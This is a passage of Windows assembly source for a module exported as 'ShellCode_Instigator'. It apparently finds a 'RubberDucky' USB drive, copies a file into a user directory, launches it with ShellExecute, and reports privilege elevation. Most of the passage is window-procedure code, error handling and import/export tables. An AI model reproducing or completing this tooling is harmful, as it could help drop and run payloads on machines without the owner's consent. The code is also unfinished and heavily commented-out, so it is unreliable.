		invoke MessageBox,NULL,Elevation_Complete_Text,Elevation_Complete_Title,MB_ICONERROR + MB_OK
	
		;invoke PostMessage,[hWnd_Main],WM_DESTROY,0,0
		;invoke PostMessage,[hwnd],WM_DESTROY,0,0
	
		;invoke KillTimer, [hWnd_Main], FILEWATCHTIMERID
		;invoke KillTimer, [hwnd], FILEWATCHTIMERID
	
		jmp	ExitFileCopy
	
	FileCopy_ACCESS_DENIED:

		cmp eax, FILE_ATTRIBUTE_HIDDEN
		je FileCopy_ACCESS_DENIED_HIDDEN

		cmp eax, FILE_ATTRIBUTE_READONLY
		je FileCopy_ACCESS_DENIED_READONLY

		FileCopy_ACCESS_DENIED_HIDDEN:
			invoke MessageBox,NULL,CopyFile_Err_ACCESS_DENIED_HIDDEN,NULL,MB_ICONERROR+MB_OK
			jmp ExitFileCopy

		FileCopy_ACCESS_DENIED_READONLY:
			invoke MessageBox,NULL,CopyFile_Err_ACCESS_DENIED_READONLY,NULL,MB_ICONERROR+MB_OK
			jmp ExitFileCopy

	ExitFileCopy:

		;invoke KillTimer, [hWnd], FILEWATCHTIMERID
		;invoke KillTimer, 0, FILEWATCHTIMERID

		;Allocation is performed in Initialize proc which is not being called at the moment.
			;invoke HeapFree,ProcessHeap,NULL,MsgBox_Text

		invoke HeapFree,ProcessHeap,NULL,lpShellExec_File
		invoke HeapFree,ProcessHeap,NULL,lpDst_FullPath
		invoke HeapFree,ProcessHeap,NULL,Username	
		invoke HeapFree,ProcessHeap,NULL,lpFull_SrcPathAndFilename

		; Post quit message:
	  		;invoke  PostQuitMessage, 0
	  		;xor eax, eax

	Delay_FileCopyOp:
		;invoke DefWindowProc,[hWnd],[uMsg],[wParam],[lParam]
		;invoke DefWindowProc,[hwnd],[uMsg],[idEvent],[dwTime]
		;jmp	FinishMsgLoop

;return	
ret
endp




;proc WndProc uses ebx esi edi, hWnd, uMsg, wParam, lParam
proc WndProc uses ebx esi edi, hWnd, uMsg, wParam, lParam

;push ebx esi edi

;local UNameSize[2]:DWORD

;mov eax, [uMsg]

cmp		[uMsg],WM_DESTROY
je		wmdestroy
cmp		[uMsg],WM_CREATE
je		wmcreate
;cmp		[uMsg],WM_SIZE
;je		wmsize
;cmp	 [uMsg],WM_PAINT
;je	 wmpaint

;In here termporarily to help debugging past hex values for uMsg's that aren't a concern.
	cmp		[uMsg],WM_GETICON		;7Fh
	je	defwndproc
	cmp		[uMsg],WM_ACTIVATEAPP	;1Ch
	je	defwndproc
	cmp		[uMsg],WM_KILLFOCUS		;08h
	je	defwndproc
	cmp		[uMsg],WM_SETFOCUS		;7h
	je	defwndproc
	
cmp		[uMsg],WM_TIMER
je		wmtimer
;cmp		[uMsg],WM_LBUTTONDOWN
;je		wmlbuttondown
;Our Message Handler Loop (typical Win32 API stuff)
defwndproc:
	invoke	DefWindowProc,[hWnd],[uMsg],[wParam],[lParam]
	jmp	FinishMsgLoop

wmcreate:
	;call Initialize

	;invoke  MessageBox,NULL,WinProc_Finished_Creating_MainWindow_DBG_MSG,NULL,MB_ICONERROR+MB_OK
	
	;invoke ShellExecute,hWnd_Main,lpShellExec_Verb,DWORD ptr lpShellExec_File,NULL,NULL,SW_SHOW
		
	;This is from the code that actually pops a shell.
	;	 invoke ShellExecute,NULL,lpShellExec_Verb,DWORD ptr lpShellExec_File,NULL,NULL,SW_SHOW
	
	;invoke SetTimer, [hWnd], FILEWATCHTIMERID, 3000, FileCopy
	;invoke SetTimer, [hWnd], FILEWATCHTIMERID, 3000, NULL
		
	invoke DefWindowProc,[hWnd],[uMsg],[wParam],[lParam]
	jmp	FinishMsgLoop

wmtimer:
	;invoke DefWindowProc,[hWnd],[uMsg],[wParam],[lParam]
	jmp	FinishMsgLoop
	
;wmsize:
	;invoke GetClientRect,[hwnd],rect
	;invoke MoveWindow,[edithwnd],[client.left],[client.top],[client.right],[client.bottom],TRUE
	;xor	eax,eax
;	jmp	FinishMsgLoop


wmdestroy:

	;Kill DirectoryMonitoring thread
		invoke	CloseHandle, [ThreadHand]
	
	; Kill timer:
	  ;invoke  KillTimer,[hWnd], MAINTIMERID
	  invoke KillTimer, [hWnd], FILEWATCHTIMERID

	;Allocation is performed in Initialize proc which is not being called at the moment.
		;invoke HeapFree,ProcessHeap,NULL,MsgBox_Text
	
	invoke HeapFree,ProcessHeap,NULL,lpShellExec_File
	invoke HeapFree,ProcessHeap,NULL,lpDst_FullPath
	invoke HeapFree,ProcessHeap,NULL,Username	
	invoke HeapFree,ProcessHeap,NULL,lpFull_SrcPathAndFilename


	; Delete all DCs and buffers:
	  ;invoke  DeleteDC, hBackDC
	  ;invoke  DeleteObject, hBackBmp

	; Release heap allocated memory back to operating system
		;invoke HeapFree,[_hheap],0,[lpFull_ExistingPathAndFilename]
		;invoke HeapFree,[_hheap],0,[lpShellExec_File]

		;invoke  HeapFree,[_hheap],0,[_argv]
	;invoke  HeapFree,[_hheap],0,[_strbuf]

	; Post quit message:
	  invoke  PostQuitMessage, 0
	  xor eax, eax

	  ;jmp FinishMsgLoop

FinishMsgLoop:
	;pop edi esi ebx
	ret
endp


proc ShowErrorMessage dwError
  local lpBuffer:DWORD
	lea	eax,[lpBuffer]
	invoke	FormatMessage,FORMAT_MESSAGE_ALLOCATE_BUFFER+FORMAT_MESSAGE_FROM_SYSTEM,0,[dwError],LANG_NEUTRAL,eax,0,0
	;invoke MessageBox,[hWnd],[lpBuffer],NULL,MB_ICONERROR+MB_OK
	invoke	MessageBox,NULL,[lpBuffer],NULL,MB_ICONERROR+MB_OK
	;ALL KINDS OF BAD HERE!!!! If dwError points to an actual variable, and it gets free'ed NASTY stack pointer
	;stuff occurs!!!!!
		;invoke LocalFree,[lpBuffer]
	ret
endp

proc ShowLastError
	invoke	GetLastError
	cmp eax, NULL
		je NoError
		;stdcall ShowErrorMessage,[hWnd],eax
		stdcall ShowErrorMessage,eax
	NoError:
		ret
endp


;from: http://www.asmcommunity.net/forums/topic/?id=21171
	proc Ansi2Unicode iString, output_buffer
	
	invoke lstrlen,iString
	invoke MultiByteToWideChar,CP_ACP,0,iString,-1,ouptbuf,eax
	
	;return
	ret
	endp

;from: http://www.asmcommunity.net/forums/topic/?id=21171
	proc Unicode2Ansi iString, output_buffer
	
	;Original line of code:
		;invoke lstrlen, output_buffer
	;invoke lstrlen, [output_buffer]
	;invoke lstrlen, addr output_buffer
	;push edx
	;	lea edx, [output_buffer]
	;		invoke strlen, edx
	;pop edx
	
	;lea ecx, [output_buffer]
	;invoke strlenW, ecx
	invoke strlenW, dword ptr output_buffer
	;invoke WideCharToMultiByte,CP_ACP,0,dword ptr iString,-1,dword ptr output_buffer,eax,0,0
	;invoke WideCharToMultiByte,CP_ACP,0,dword ptr iString,-1,dword ptr output_buffer,eax,0,0
	
	;invoke WideCharToMultiByte,CP_ACP,0,[iString],-1,[output_buffer],eax,0,0
	;invoke WideCharToMultiByte,CP_ACP,0,[iString],-1,[output_buffer],eax,0,0
	
	push ebx
	push ecx
	
	;mov ebx, addr iString
	;mov ecx, addr output_buffer
	lea ebx, [iString]
	lea ecx, [output_buffer]
	
	;invoke WideCharToMultiByte,CP_ACP,0,addr iString,-1,addr output_buffer,MAX_PATH,0,0
	;invoke WideCharToMultiByte,CP_ACP,0,addr iString,-1,addr output_buffer,MAX_PATH,0,0
	invoke WideCharToMultiByte,CP_ACP,0,ebx,-1,ecx,MAX_PATH,0,0
	invoke WideCharToMultiByte,CP_ACP,0,ebx,-1,ecx,MAX_PATH,0,0
	
	;return
	ret
	endp


section '.idata' import data readable

  library kernel,'KERNEL32.DLL',\
	  user,'USER32.DLL',\
	  shell32,'SHELL32.DLL',\
	  msvcrt,'msvcrt.dll',\
	  ole,'OLE32.DLL',\
	  advapi32,'advapi32.dll',\
	  shlwapi,'Shlwapi.dll',\
	  GDI32,'GDI32.DLL'

	;include '%fasm%/api/kernel32.inc' 
    ;include '%fasm%/api/shell32.inc'
    ;include '..\include\api\kernel32.inc' 
    ;include '..\include\api\shell32.inc' 
	
  import kernel,\
	 SetUnhandledExceptionFilter, 'SetUnhandledExceptionFilter',\
	 GetCommandLine,'GetCommandLineA',\
	 GetModuleHandle,'GetModuleHandleA',\
	 GetDriveType,'GetDriveTypeA',\
	 GetVolumeInformation,'GetVolumeInformationA',\
	 GetProcessHeap,'GetProcessHeap',\
     	HeapAlloc,'HeapAlloc',\
     	HeapFree,'HeapFree',\
     	CreateThread,'CreateThread',\
     	RtlZeroMemory,'RtlZeroMemory',\
	 GetProcAddress, 'GetProcAddress',\
	 LoadLibrary,'LoadLibraryA',\
	 OpenFile,'OpenFile',\
	 CreateFile,'CreateFileA',\
	 ReadFile,'ReadFile',\
	 ReadDirectoryChangesW,'ReadDirectoryChangesW',\
	 WideCharToMultiByte,'WideCharToMultiByte',\
	 MultiByteToWideChar,'MultiByteToWideChar',\
	 CreateProcess,'CreateProcessA',\
	 WaitForSingleObject,'WaitForSingleObject',\
	 GetStartupInfo,'GetStartupInfoA',\
	 CloseHandle,'CloseHandle',\
	 ExitProcess,'ExitProcess',\
	 CopyFile,'CopyFileA',\
	 GetTickCount,'GetTickCount',\
	 GetLastError,'GetLastError',\
	 FormatMessage,'FormatMessageA',\
	 LocalFree,'LocalFree',\
	 FindFirstFile,'FindFirstFileA',\
	 strlen,'lstrlenA',\
	 strlenW,'lstrlenW',\
	 lstrcmp,'lstrcmpA',\
	 lstrcat,'lstrcatA'

  import user,\
	 BeginPaint,'BeginPaint',\
	 CreateWindowEx,'CreateWindowExA',\
	 DefWindowProc,'DefWindowProcA',\
	 DestroyWindow,'DestroyWindow',\
	 DispatchMessage,'DispatchMessageA',\
	 PeekMessage,'PeekMessageA',\
	 PostMessage,'PostMessageA',\
	 PostQuitMessage,'PostQuitMessage',\
	 RegisterClass,'RegisterClassA',\
	 RegisterClassEx,'RegisterClassExA',\
	 ReleaseDC,'ReleaseDC',\
	 ShowWindow,'ShowWindow',\
	 GetSystemMetrics,'GetSystemMetrics',\
	 TranslateMessage,'TranslateMessage',\
	 KillTimer,'KillTimer',\
	 SetCursor,'SetCursor',\
	 SetTimer,'SetTimer',\
	 EndPaint,'EndPaint',\
	 GetClientRect,'GetClientRect',\
	 GetDC,'GetDC',\
	 GetMessage,'GetMessageA',\
	 LoadCursor,'LoadCursorA',\
	 LoadIcon,'LoadIconA',\
	 DialogBoxParam,'DialogBoxParamA',\
	 MessageBox,'MessageBoxA',\
	 EndDialog,'EndDialog',\
	 ScreenToClient,'ScreenToClient',\
	 SendMessage, 'SendMessageA',\
	 UpdateWindow,'UpdateWindow',\
	 wsprintf,'wsprintfA'

  import shell32,\
	 ShellExecute,'ShellExecuteA',\
	 ShellExecuteEx,'ShellExecuteExA'
	 ;ShellExecuteEx,'ShellExecuteExW'
	
  import msvcrt,\
	 malloc, 'malloc',\
	 memset, 'memset'
			 ;wmemset is the wide-char version
	 
  import ole,\
	 CoInitialize,			'CoInitialize',\
	 CoCreateInstance,		'CoCreateInstance',\
	 CoInitializeEx,		'CoInitializeEx',\
	 CoInitializeSecurity,	'CoInitializeSecurity',\
	 CoSetProxyBlanket,		'CoSetProxyBlanket',\
	 CoUninitialize,		'CoUninitialize',\
	 IsEqualGUID,			'IsEqualGUID'

  import advapi32,\
	 GetUserName,'GetUserNameA' 

  import shlwapi,\
	 StrCpyN, 'StrCpyNW',\
	 StrCpy,  'StrCpyW',\
	 strcmp,  'StrCmpW',\
	 StrCmpC, 'StrCmpCA',\
	 StrStrI,  'StrStrIA'
	 
  import GDI32,\
	  BitBlt,'BitBlt',\
	  CreateCompatibleBitmap,'CreateCompatibleBitmap',\
	  CreateCompatibleDC,'CreateCompatibleDC',\
	  CreateDIBSection,'CreateDIBSection',\
	  DeleteDC,'DeleteDC',\
	  DeleteObject,'DeleteObject',\
	  SelectObject,'SelectObject'



section '.exports' export data readable
	export 'ShellCode_Instigator',\
		Allocate_Full_DstPath_Mem,							'Allocate_Full_DstPath_Mem',							\
		Allocate_Full_ShellExecPath_Mem,						'Allocate_Full_ShellExecPath_Mem',						\
		Allocate_Full_SrcPath_Mem,							'Allocate_Full_SrcPath_Mem',							\
		Allocate_Username_Mem,								'Allocate_Username_Mem',								\
		Build_Full_DstPath,									'Build_Full_DstPath',									\
		Build_Full_ShellExecPath,								'Build_Full_ShellExecPath',								\
		Build_Full_SrcPath,									'Build_Full_SrcPath',									\
		Find_RubberDucky,									'Find_RubberDucky',									\
		Get_Dst_PathAndFile_Length,							'Get_Dst_PathAndFile_Length',							\
		Get_ShellExecPath_Length,							'Get_ShellExecPath_Length',							\
		Get_Username,										'Get_Username',										\
		Initialize,											'Initialize',											\
		ShowErrorMessage,									'ShowErrorMessage',									\
		ShowLastError,										'ShowLastError',										\
		Store_Username,									'Store_Username',									\
		TimerProc_FileCopy,									'TimerProc_FileCopy',									\
		WndProc,											'WndProc',											\
		AppName,											'AppName',										\
		ClassName,										'ClassName',										\
		wc,												'wc',												\
		Max_DriveLetter,									'Max_DriveLetter',									\
		Current_Drv_Letter,									'Current_Drv_Letter',									\
		Test_Drv_Letter,										'Test_Drv_Letter',									\
		VolIter_Exhausted_MSG,								'VolIter_Exhausted_MSG',								\
		VolIter_RD_Found_MSG,								'VolIter_RD_Found_MSG',								\
		Src_Drv_Label,										'Src_Drv_Label',										\
		Full_SrcPathAndFilename,								'Full_SrcPathAndFilename',								\
		Full_SrcPathAndFilename_length,						'Full_SrcPathAndFilename_length',						\
		WinMain_Pre_RegisterClassEx_DBG_Msg,					'WinMain_Pre_RegisterClassEx_DBG_Msg',				\
		WinMain_AfterRegisterClassEx_DBG_Msg,					'WinMain_AfterRegisterClassEx_DBG_Msg',				\
		Start_Pre_Initialize_DBG_Msg,							'Start_Pre_Initialize_DBG_Msg',							\
		Start_Post_Initialize_DBG_Msg,							'Start_Post_Initialize_DBG_Msg',							\
		WinMain_Pre_CreateWindowEx_DBG_Msg,				'WinMain_Pre_CreateWindowEx_DBG_Msg',				\
		WinMain_Post_CreateWindowEx_DBG_Msg,				'WinMain_Post_CreateWindowEx_DBG_Msg',				\
		WinMain_Showing_Window_DBG_Msg,					'WinMain_Showing_Window_DBG_Msg',					\
		WinMain_Updating_Window_DBG_Msg,					'WinMain_Updating_Window_DBG_Msg',					\
		WinMain_Error_Terminating_Process_DBG_MSG,			'WinMain_Error_Terminating_Process_DBG_MSG',			\
		WinProc_Create_Main_Window_DBG_MSG,				'WinProc_Create_Main_Window_DBG_MSG',				\
		WinProc_Create_Main_BackBuffer_DBG_MSG,				'WinProc_Create_Main_BackBuffer_DBG_MSG',				\
		WinProc_Finished_Creating_MainWindow_DBG_MSG,			'WinProc_Finished_Creating_MainWindow_DBG_MSG',		\
		WinProc_Pre_StrCpyN_Call_1_DBG_MSG,					'WinProc_Pre_StrCpyN_Call_1_DBG_MSG',				\
		WinProc_Post_StrCpyN_Call_1_DBG_MSG,				'WinProc_Post_StrCpyN_Call_1_DBG_MSG',				\
		WinProc_Pre_StrCpyN_Call_2_DBG_MSG,					'WinProc_Pre_StrCpyN_Call_2_DBG_MSG',				\
		WinProc_Post_StrCpyN_Call_2_DBG_MSG,				'WinProc_Post_StrCpyN_Call_2_DBG_MSG',				\
		DBG_MSG_Calling_Build_Full_DstPath,					'DBG_MSG_Calling_Build_Full_DstPath',					\
		DBG_MSG_Calling_Build_Full_SrcPath,					'DBG_MSG_Calling_Build_Full_SrcPath',					\
		DBG_MSG_Calling_Build_Full_ShellExecPath,				'DBG_MSG_Calling_Build_Full_ShellExecPath',				\
		DBG_MSG_Calling_Allocate_Full_SrcPath_Mem,				'DBG_MSG_Calling_Allocate_Full_SrcPath_Mem',			\
		DBG_MSG_Calling_Find_RubberDucky,					'DBG_MSG_Calling_Find_RubberDucky',					\
		DBG_MSG_Adding_RubberDucky_to_SrcPath,				'DBG_MSG_Adding_RubberDucky_to_SrcPath',				\
		DBG_MSG_Allocate_Full_SrcPath_Mem_BP1,				'DBG_MSG_Allocate_Full_SrcPath_Mem_BP1',				\
		DBG_MSG_Allocate_Full_SrcPath_Mem_BP2,				'DBG_MSG_Allocate_Full_SrcPath_Mem_BP2',				\
		DBG_MSG_Allocate_Full_SrcPath_Mem_BP3,				'DBG_MSG_Allocate_Full_SrcPath_Mem_BP3',				\
		DBG_MSG_Error_Retrieving_Username,					'DBG_MSG_Error_Retrieving_Username',					\
		ShellExec_Err_OOM,									'ShellExec_Err_OOM',								\
		ShellExec_Err_File_Not_Found,							'ShellExec_Err_File_Not_Found',							\
		ShellExec_Err_Path_Not_Found,							'ShellExec_Err_Path_Not_Found',						\
		ShellExec_Err_Bad_Format,							'ShellExec_Err_Bad_Format',							\
		ShellExec_Err_SE_Access_Denied,						'ShellExec_Err_SE_Access_Denied',						\
		ShellExec_Err_SE_Assoc_Incomp,						'ShellExec_Err_SE_Assoc_Incomp',						\
		ShellExec_Err_SE_DDE_Busy,							'ShellExec_Err_SE_DDE_Busy',							\
		ShellExec_Err_SE_DDE_Fail,							'ShellExec_Err_SE_DDE_Fail',							\
		ShellExec_Err_SE_DDE_Timeout,						'ShellExec_Err_SE_DDE_Timeout',						\
		ShellExec_Err_SE_DLL_Not_Found,						'ShellExec_Err_SE_DLL_Not_Found',						\
		ShellExec_Err_SE_FNF,								'ShellExec_Err_SE_FNF',								\
		ShellExec_Err_SE_No_Assoc,							'ShellExec_Err_SE_No_Assoc',							\
		ShellExec_Err_SE_OOM,								'ShellExec_Err_SE_OOM',								\
		ShellExec_Err_SE_PNF,								'ShellExec_Err_SE_PNF',								\
		ShellExec_Err_Share,								'ShellExec_Err_Share',								\
		FindFile_Err_NO_MORE_FILES,							'FindFile_Err_NO_MORE_FILES',						\
		CopyFile_Err_ACCESS_DENIED_HIDDEN,					'CopyFile_Err_ACCESS_DENIED_HIDDEN',					\
		CopyFile_Err_ACCESS_DENIED_READONLY,				'CopyFile_Err_ACCESS_DENIED_READONLY',				\
		Username_MaxLength,								'Username_MaxLength',								\
		Pre_DstPath,										'Pre_DstPath',										\
		Post_DstPath,										'Post_DstPath',										\
		Dst_Filename,										'Dst_Filename',										\
		ShellExecute_Drv,									'ShellExecute_Drv',									\
		ShellExecute_WinDir,									'ShellExecute_WinDir',								\
		ShellExecute_AMD64,								'ShellExecute_AMD64',								\
		ShellExecute_x86,									'ShellExecute_x86',									\
		ShellExecute_Filename,								'ShellExecute_Filename',								\
		ShellExecute_FileTst,									'ShellExecute_FileTst',								\
		lpShellExec_Verb,									'lpShellExec_Verb',									\
		lpShellExec_Params,									'lpShellExec_Params',								\
		TaskName,										'TaskName',										\
		ProcessHeap,										'ProcessHeap',										\
		msg,												'msg',											\
		FileInfo,											'FileInfo',											\
		ShExecInfo,										'ShExecInfo',										\
		hInstance,											'hInstance',										\
		ShellExec_hInstance,									'ShellExec_hInstance',								\
		hWnd_Main,										'hWnd_Main',										\
		VolInfo,											'VolInfo',											\
		Src_Drv_Letter,										'Src_Drv_Letter',										\
		lpVolumeName_Buffer,								'lpVolumeName_Buffer',								\
		lpFull_SrcPathAndFilename,							'lpFull_SrcPathAndFilename',							\
		lpFull_SrcPaF,										'lpFull_SrcPaF',										\
		sName,											'sName',											\
		Username,											'Username',										\
		Username_Length,									'Username_Length',									\
		lpDst_Path_Length,									'lpDst_Path_Length',									\
		lpDst_FullPath,										'lpDst_FullPath',										\
		lpShellExec_File_Length,								'lpShellExec_File_Length',								\
		lpShellExec_File,									'lpShellExec_File',									\
		MsgBox_Text,										'MsgBox_Text',										\
		MsgBox_Count,										'MsgBox_Count',									\
		Stack_Pointer,										'Stack_Pointer',										\
		Stack_BasePointer,									'Stack_BasePointer',									\
		msg_loop,											'msg_loop',										\
		Error,											'Error',											\
		Exit_Proc,											'Exit_Proc',										\
		RB_Drive_1,										'RB_Drive_1',										\
		RB_Drive_1_Exhausted,								'RB_Drive_1_Exhausted',								\
		RB_Drive_1_Found,									'RB_Drive_1_Found',									\
		Src_Path_Build,										'Src_Path_Build',									\
		Finish_Src_Path_Build,								'Finish_Src_Path_Build',								\
		UserNameRetrieved,									'UserNameRetrieved',									\
		Store_UN,											'Store_UN',										\
		Store_UN_Finished,									'Store_UN_Finished',									\
		Dst_Path_Build_1,									'Dst_Path_Build_1',									\
		Dst_Path_Build_2_1,									'Dst_Path_Build_2_1',									\
		Dst_Path_Build_2_2,									'Dst_Path_Build_2_2',									\
		Dst_Path_Build_3_1,									'Dst_Path_Build_3_1',									\
		Dst_Path_Build_3_2,									'Dst_Path_Build_3_2',									\
		Finish_DPB,										'Finish_DPB',										\
		Dst_FullPath_Build_1,								'Dst_FullPath_Build_1',								\
		Dst_FullPath_Build_2_1,								'Dst_FullPath_Build_2_1',								\
		Dst_FullPath_Build_2_2,								'Dst_FullPath_Build_2_2',								\
		Dst_FullPath_Build_3_1,								'Dst_FullPath_Build_3_1',								\
		Dst_FullPath_Build_3_2,								'Dst_FullPath_Build_3_2',								\
		Finish_DFPB,										'Finish_DFPB',										\
		ShellExecute_Path_Build_1,							'ShellExecute_Path_Build_1',							\
		ShellExecute_Path_Build_2_1,							'ShellExecute_Path_Build_2_1',							\
		ShellExecute_Path_Build_2_2,							'ShellExecute_Path_Build_2_2',							\
		ShellExecute_Path_Build_3_1,							'ShellExecute_Path_Build_3_1',							\
		ShellExecute_Path_Build_3_2,							'ShellExecute_Path_Build_3_2',							\
		ShellExecute_Path_Build_4_1,							'ShellExecute_Path_Build_4_1',							\
		ShellExecute_Path_Build_4_2,							'ShellExecute_Path_Build_4_2',							\
		Finish_SEPB,										'Finish_SEPB',										\
		ByteToDWORD_1,									'ByteToDWORD_1',									\
		Adj_Stack_1,										'Adj_Stack_1',										\
		Finish_BtD_1,										'Finish_BtD_1',										\
		ByteToDWORD_2,									'ByteToDWORD_2',									\
		Adj_Stack_2,										'Adj_Stack_2',										\
		Finish_BtD_2,										'Finish_BtD_2',										\
		CreateFile_Invalid_Handle_Value,						'CreateFile_Invalid_Handle_Value',						\
		CreateFile_SUCCESS,								'CreateFile_SUCCESS',								\
		FindFile_Error,										'FindFile_Error',										\
		FileNotExistantYet,									'FileNotExistantYet',									\
		FileCopy_ACCESS_DENIED,							'FileCopy_ACCESS_DENIED',							\
		FileCopy_ACCESS_DENIED_HIDDEN,					'FileCopy_ACCESS_DENIED_HIDDEN',					\
		FileCopy_ACCESS_DENIED_READONLY,					'FileCopy_ACCESS_DENIED_READONLY',					\
		ExitFileCopy,										'ExitFileCopy',										\
		defwndproc,										'defwndproc',										\
		wmcreate,											'wmcreate',										\
		wmtimer,											'wmtimer',											\
		wmdestroy,										'wmdestroy',										\
		FinishMsgLoop,										'FinishMsgLoop',									\
		NoError,											'NoError',											\
		EntryPoint,										'EntryPoint',										\
		DirectoryMonitor_ThreadProc,							'DirectoryMonitor_ThreadProc',							\
		Invalid_GUID_Directory,								'Invalid_GUID_Directory',								\
		BurnTheHouseDown_FileCopy,							'BurnTheHouseDown_FileCopy',							\
		BurnTheHousedown_FileCopy_AttemptExhausted,			'BurnTheHousedown_FileCopy_AttemptExhausted',			\
		FileManager_Initialize,								'FileManager_Initialize',								\
		FileManager_Create_Add_UniqueNameTableSlot,				'FileManager_Create_Add_UniqueNameTableSlot',			\
		FileManager_Get_FileOpen_NextFreeIndex,					'FileManager_Get_FileOpen_NextFreeIndex',				\
		FileManager_Get_FileOpenIndex_ByFilename,				'FileManager_Get_FileOpenIndex_ByFilename',				\
		FileManager_Create_FileOpen_Slot,						'FileManager_Create_FileOpen_Slot',						\
		FileManager_OpenFile_Split,							'FileManager_OpenFile_Split',							\
		FileManager_ReadFromFile_ByIndex,						'FileManager_ReadFromFile_ByIndex',						\
		FileManager_Copy_NameTable_Slot,						'FileManager_Copy_NameTable_Slot',						\
		FileManager_Copy_FileOpen_Slot,						'FileManager_Copy_FileOpen_Slot',						\
		Check_IndexInUse,									'Check_IndexInUse',									\
		Continue_Check_IndexInUse,							'Continue_Check_IndexInUse',							\
		Found_Free_Index,									'Found_Free_Index',									\
		Get_FileOpen_ElementList_Exhausted,					'Get_FileOpen_ElementList_Exhausted',					\
		Get_FileOpen_NoElements,							'Get_FileOpen_NoElements',							\
		Get_FileOpen_NextFreeIndex_Exit,						'Get_FileOpen_NextFreeIndex_Exit',						\
		GetFOI_BF_Check_Name,								'GetFOI_BF_Check_Name',								\
		Continue_GetFOI_BF_Check_Name,						'Continue_GetFOI_BF_Check_Name',						\
		GetFOI_BF_Index_NotFound,							'GetFOI_BF_Index_NotFound',							\
		GetFOI_BF_Index_Found,								'GetFOI_BF_Index_Found',								\
		GetFOI_BF_Exit,									'GetFOI_BF_Exit',									\
		Create_FileOpen_ResizeOnly,							'Create_FileOpen_ResizeOnly',							\
		Resize_FilesOpenedArray,								'Resize_FilesOpenedArray',								\
		Create_FileOpen_CopyBackOver,						'Create_FileOpen_CopyBackOver',						\
		Create_FileOpen_CopyElementFromTempArray,				'Create_FileOpen_CopyElementFromTempArray',				\
		Create_FileOpen_Exit,								'Create_FileOpen_Exit',								\
		Create_FileOpen_FreeIndexExists,						'Create_FileOpen_FreeIndexExists',						\
		OpenFile_OpenFile,									'OpenFile_OpenFile',									\
		OpenFile_Error,										'OpenFile_Error',										\
		OpenFile_FileAlreadyOpen,								'OpenFile_FileAlreadyOpen',							\
		OpenFile_Exit,										'OpenFile_Exit',										\
		FileManager_ReadFile_Check1,							'FileManager_ReadFile_Check1',							\
		FileManager_ReadFile_Check2,							'FileManager_ReadFile_Check2',							\
		FileManager_ReadFile_Check2_GT_0,						'FileManager_ReadFile_Check2_GT_0',					\
		FileManager_ReadFile_ChecksPassed,					'FileManager_ReadFile_ChecksPassed',					\
		FileManager_ReadFile_Index_OOB_Err,					'FileManager_ReadFile_Index_OOB_Err',					\
		FileManager_ReadFile_Done,							'FileManager_ReadFile_Done',							\
		Initial_FilesOpened_ArraySize,							'Initial_FilesOpened_ArraySize',							\
		lpFileManager,										'lpFileManager',										\
		New_FileOpen_Slot,									'New_FileOpen_Slot',									\
		UniqueNameTable_Global_CreateSlot,						'UniqueNameTable_Global_CreateSlot',					\
		UniqueNameTable_Global_AllocateSlot,					'UniqueNameTable_Global_AllocateSlot',					\
		UniqueNameTable_Global_AllocateSlot_CopyToTemp,			'UniqueNameTable_Global_AllocateSlot_CopyToTemp',			\
		UniqueNameTable_Global_AllocateSlot_CopyToTemp_Done,		'UniqueNameTable_Global_AllocateSlot_CopyToTemp_Done',	\
		UniqueNameTable_Global_AllocateSlot_CopyFromTemp,		'UniqueNameTable_Global_AllocateSlot_CopyFromTemp',		\
		UniqueNameTable_Global_AllocateSlot_CopyFromTemp_Done,	'UniqueNameTable_Global_AllocateSlot_CopyFromTemp_Done',	\
		UniqueNameTable_Global_CreateSlot_Exit,					'UniqueNameTable_Global_CreateSlot_Exit',					\
		Copy_OFStruct_Continue,								'Copy_OFStruct_Continue',								\
		Copy_OFStruct_Done,								'Copy_OFStruct_Done',								\
		Util_Generate_Escape_Backslash,						'Util_Generate_Escape_Backslash',						\
		Util_Get_StrLen,									'Util_Get_StrLen',									\
		Util_CreateEscaped_DestStr_Loop,						'Util_CreateEscaped_DestStr_Loop',						\
		Util_CreateEscaped_DestStr_Loop_Done,					'Util_CreateEscaped_DestStr_Loop_Done',					\
		DebugPoint1,										'DebugPoint1',										\
		Allocate_Memory,									'Allocate_Memory',									\
		FileManager_Initialize_Label,							'FileManager_Initialize_Label',							\
		FileManager_Create_Add_UniqueNameTableSlot_Label,		'FileManager_Create_Add_UniqueNameTableSlot_Label',		\
		FileManager_Get_FileOpen_NextFreeIndex_Label,			'FileManager_Get_FileOpen_NextFreeIndex_Label',			\
		FileManager_Get_FileOpenIndex_ByFilename_Label,			'FileManager_Get_FileOpenIndex_ByFilename_Label',			\
		FileManager_Create_FileOpen_Slot_Label,					'FileManager_Create_FileOpen_Slot_Label',					\
		FileManager_OpenFile_Split_Label,						'FileManager_OpenFile_Split_Label',						\
		FileManager_Copy_NameTable_Slot_Label,					'FileManager_Copy_NameTable_Slot_Label',				\
		FileManager_Copy_FileOpen_Slot_Label,					'FileManager_Copy_FileOpen_Slot_Label',					\
		FileManager_ReadFromFile_ByIndex_Label,					'FileManager_ReadFromFile_ByIndex_Label',				\
		FileManager_WriteToFile_ByHandleNum_Label,				'FileManager_WriteToFile_ByHandleNum_Label',				\
		Util_Get_NonEscaped_StrLen_Label,						'Util_Get_NonEscaped_StrLen_Label',						\
		Util_Get_StrLen_Label,								'Util_Get_StrLen_Label',								\
		Util_Generate_Escape_Backslash_Label,					'Util_Generate_Escape_Backslash_Label',					\
		Util_Str_Escaped_Label,								'Util_Str_Escaped_Label'
		
		;FileManager_WriteToFile_ByIndex_Label,					'FileManager_WriteToFile_ByIndex_Label',\
		;'FileManager_CloseFile_ByHandleNum_Label,				'FileManager_CloseFile_ByHandleNum_Label',\
		;FileManager_Is_Index_Valid_Label,						'FileManager_Is_Index_Valid_Label',\
		;FileManager_CloseFile_ByIndex_Label,					'FileManager_CloseFile_ByIndex_Label',\

		;lpFilePath_CopyContinue,						'lpFilePath_CopyContinue',\
		;lpFilePath_CopyDone,							'lpFilePath_CopyDone',\
		;lpFilename_CopyContinue,						'lpFilename_CopyContinue',\
		;lpFilename_CopyDone,							'lpFilename_CopyDone'

		;dwDirectoryChange_BufferLength,					'dwDirectoryChange_BufferLength',\
		;dwBytesReturned,								'dwBytesReturned',\
		;Directory_Handle,								'Directory_Handle'
		;pLoc,											'pLoc',\
		;pSvc,											'pSvc',\
		;pUnsecApp,										'pUnsecApp',\
		;pSink,											'pSink',\
		;pStubUnk,										'pStubUnk',\
		;pStubSink,										'pStubSink',\
		;WMI_Query,										'WMI_Query',\
		;SetUp_COM,										'SetUp_COM',\
